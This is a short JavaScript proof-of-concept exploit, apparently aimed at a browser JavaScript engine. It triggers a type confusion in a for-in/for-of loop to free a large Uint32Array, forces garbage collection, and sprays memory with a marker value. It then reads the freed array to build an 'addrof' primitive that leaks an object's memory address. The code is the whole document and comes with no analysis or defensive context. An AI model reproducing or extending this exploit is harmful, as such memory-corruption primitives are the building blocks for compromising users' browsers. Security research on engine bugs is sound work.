function toReadable(address){
    return "0x" + address.map(x => x.toString(16).padStart(8, "0")).join("")
}

function trigger(){
    var o = {};
    for (var i in {xx: ""}) {
        for (i of [arr]) {}
        o[i];
    }

    // Garbage collect
    for(var x = 0; x < 1; x++)for (var i = 0; i < 0x200000; i++) {
        new Uint32Array(0x1000)
    }

    // arr is now freed and can read memory
}

function addrof(obj) {

    // search the freed array for this number
    var locator = 0x1337;

    // spray the freed memory with the locator
    var sprays = [];
    for (var i = 0; i < 0x1000; ++i) {
        sprays.push(i % 2 == 0 ? locator : obj);
    }

    // find the first instance of the locator
    var found = null;
    for(var i = 0; i < arr.length; i++) {
        if(arr[i] == locator) {
            found = i
            break
        }
    }

    // the pointer for the object is 3 and 2 indicies after the locator
    return found && [arr[found + 3], arr[found + 2]]

}

// this array will be freed and used to read memory
var arr = new Uint32Array(1 * 1024 * 1024 / 4); // 1mb | 1 item == 4 bytes
arr[4] = 0xb0; // to pass checks for the member m_hashAndFlags 

// trigger type confusion and free arr
trigger()

// locate this object witin freed array
let target = {
    foo: "bar"
}
print(describe(target))

let address = addrof(target)
if(address){
    print("addrof:", toReadable(address))
} else print("Could not find address")
